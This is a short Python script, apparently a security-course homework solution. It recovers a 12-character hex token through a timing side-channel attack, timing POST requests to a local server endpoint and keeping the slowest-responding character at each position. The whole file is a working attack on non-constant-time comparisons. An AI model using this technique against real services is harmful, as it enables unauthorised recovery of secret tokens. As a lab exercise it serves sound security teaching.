import requests
import time

def main(): 
  possible_characters = "abcdef1234567890"
  token = "            "
  for i in range(12):
    c = ""
    l = 0
    for j in possible_characters:
      start_time = time.time()
      t = list(token)
      t[i] = j
      token = ''.join(t)
      print(token, end="\r")
      response = requests.post("http://0.0.0.0:8080/hw6/ex1", json={"email": "nico@epfl.ch", "token": token})
      if response.status_code == 200:
        print(token)
        print(response.text)
        return
      time_spent = (time.time() - start_time)
      if time_spent > l:
        l = time_spent
        c = j
    t = list(token)
    t[i] = c
    token = ''.join(t)

if __name__ == '__main__':
    main()
